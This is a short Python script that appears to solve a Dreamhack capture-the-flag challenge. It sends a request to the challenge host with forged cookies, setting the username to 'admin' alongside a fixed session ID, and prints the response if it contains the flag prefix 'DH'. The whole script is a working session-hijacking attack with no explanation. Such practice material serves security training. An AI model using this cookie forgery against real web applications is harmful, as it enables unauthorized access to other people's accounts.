import requests

r = requests.session()
url = "http://host3.dreamhack.games:19086/"
sessionid = "782b89b581d48bc41960b14847fa5dc8794424ac270144db649dc8068e775240"
cookies = {"username":"admin", "sessionid":sessionid}
res = r.get(url, cookies=cookies)
if "DH" in res.text:
    print(res.text)
